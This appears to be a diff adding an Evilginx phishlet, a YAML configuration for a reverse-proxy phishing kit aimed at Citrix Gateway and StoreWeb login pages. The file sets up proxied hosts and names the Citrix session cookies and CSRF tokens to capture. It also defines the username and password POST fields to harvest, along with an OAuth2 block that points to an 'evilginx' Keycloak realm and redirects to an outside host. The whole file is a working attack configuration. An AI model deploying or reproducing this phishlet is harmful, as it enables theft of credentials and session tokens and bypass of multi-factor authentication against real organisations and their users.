@@ -1,0 +1,36 @@
+name: 'Citrix Portal'
+author: '@424f424f'
+min_ver: '3.0.0'
+redirect_url: 'https://portal.example.com/'
+proxy_hosts:
+  - {phish_sub: 'subdomainhere', orig_sub: 'subdomainhere', domain: 'domainhere', session: true, is_landing: true, auto_filter: true}
+sub_filters:
+  - {triggers_on: 'domainhere', orig_sub: 'subdomainhere', domain: 'domainhere', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript']}
+auth_tokens:
+  - domain: 'domainhere'
+    keys: ['ASP.NET_SessionId:always','CsrfToken:always','NSC_AAAC:always','NSC_DLGE:always','pwcount:always']
+    type: 'cookie'
+auth_urls:
+  - '/vpn/index.html'
+  - '/Citrix/StoreWeb/'
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'subdomainhere.domainhere'
+  path: '/vpn/index.html'
+oauth2:
+  client_id: 'evilginx-proxy-citrix'
+  client_secret: 'e7f8a9b0c1d234567890abcdef1234567890abcdef1234567890abcdef12345678'
+  redirect_uri: 'https://citrix.uploadfile.space'
+  authorization_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/auth'
+  token_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/token'
+  userinfo_endpoint: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/userinfo'
+  jwks_uri: 'http://keycloak:8080/realms/evilginx/protocol/openid-connect/certs'
+  scope: 'openid email profile offline_access evilginx-phishlet'
